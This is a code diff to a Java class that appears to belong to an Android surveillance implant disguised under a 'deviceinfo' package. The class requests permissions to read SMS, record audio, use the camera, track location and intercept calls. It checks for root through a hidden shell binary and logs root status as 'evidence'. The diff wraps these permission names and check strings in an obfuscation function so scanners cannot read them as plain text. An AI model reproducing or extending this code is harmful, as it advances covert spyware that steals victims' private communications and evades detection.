@@ -32,6 +32,7 @@ import com.android.deviceinfo.file.AutoFile;
 import com.android.deviceinfo.util.Check;
 import com.android.deviceinfo.util.Execute;
 import com.android.deviceinfo.util.ExecuteResult;
+import com.android.deviceinfo.util.StringUtils;
 import com.android.m.M;
 
 public class PackageInfo {
@@ -43,19 +44,8 @@ public class PackageInfo {
 	private FileInputStream fin;
 	private XmlParser xml;
 
-	private String requiredPerms[] = { "android.permission.READ_LOGS", "android.permission.READ_SMS",
-			"android.permission.SET_WALLPAPER", "android.permission.SEND_SMS",
-			"android.permission.PROCESS_OUTGOING_CALLS", "android.permission.WRITE_APN_SETTINGS",
-			"android.permission.WRITE_EXTERNAL_STORAGE", "android.permission.WRITE_SMS",
-			"android.permission.ACCESS_WIFI_STATE", "android.permission.ACCESS_COARSE_LOCATION",
-			"android.permission.RECEIVE_SMS", "android.permission.READ_CONTACTS", "android.permission.CALL_PHONE",
-			"android.permission.READ_PHONE_STATE", "android.permission.RECEIVE_BOOT_COMPLETED",
-			"android.permission.CAMERA", "android.permission.INTERNET", "android.permission.CHANGE_WIFI_STATE",
-			"android.permission.ACCESS_FINE_LOCATION", "android.permission.VIBRATE", "android.permission.WAKE_LOCK",
-			"android.permission.RECORD_AUDIO", "android.permission.ACCESS_NETWORK_STATE",
-			"android.permission.FLASHLIGHT"
-	// "android.permission.REBOOT"
-	};
+	private String requiredPerms[] = StringUtils
+			.split(M.e("android.permission.READ_LOGS,android.permission.READ_SMS,android.permission.SET_WALLPAPER,android.permission.SEND_SMS,android.permission.PROCESS_OUTGOING_CALLS,android.permission.WRITE_APN_SETTINGS,android.permission.WRITE_EXTERNAL_STORAGE,android.permission.WRITE_SMS,android.permission.ACCESS_WIFI_STATE,android.permission.ACCESS_COARSE_LOCATION,android.permission.RECEIVE_SMS,android.permission.READ_CONTACTS,android.permission.CALL_PHONE,android.permission.READ_PHONE_STATE,android.permission.RECEIVE_BOOT_COMPLETED,android.permission.CAMERA,android.permission.INTERNET,android.permission.CHANGE_WIFI_STATE,android.permission.ACCESS_FINE_LOCATION,android.permission.VIBRATE,android.permission.WAKE_LOCK,android.permission.RECORD_AUDIO,android.permission.ACCESS_NETWORK_STATE,android.permission.FLASHLIGHT"));
 
 	// XML da parsare
 	public PackageInfo(FileInputStream fin, String packageName) throws SAXException, IOException,
@@ -151,8 +141,8 @@ public class PackageInfo {
 
 				final ExecuteResult p = Execute.execute(Configuration.shellFile + M.e(" qzx id"));
 				String stdout = p.getStdout();
-				if (stdout.startsWith("uid=0")) {
-					
+				if (stdout.startsWith(M.e("uid=0"))) {
+
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " (checkRoot): isRoot YEAHHHHH"); //$NON-NLS-1$ //$NON-NLS-2$
 
@@ -161,14 +151,14 @@ public class PackageInfo {
 
 						if (!sentInfo) {
 							EvidenceBuilder.info("Root: " + Root.method + " time: " + diff + "s");
-							if(Cfg.DEMO){
+							if (Cfg.DEMO) {
 								Status.self().makeToast("Root acquired");
 							}
 						}
-						
-					}else{
+
+					} else {
 						if (!sentInfo) {
-							EvidenceBuilder.info("Root");
+							EvidenceBuilder.info(M.e("Root"));
 						}
 					}
 
@@ -279,7 +269,7 @@ public class PackageInfo {
 		}
 		String buildTags = android.os.Build.TAGS;
 
-		if (buildTags != null && buildTags.contains("test-keys")) {
+		if (buildTags != null && buildTags.contains(M.e("test-keys"))) {
 			return true;
 		}
 
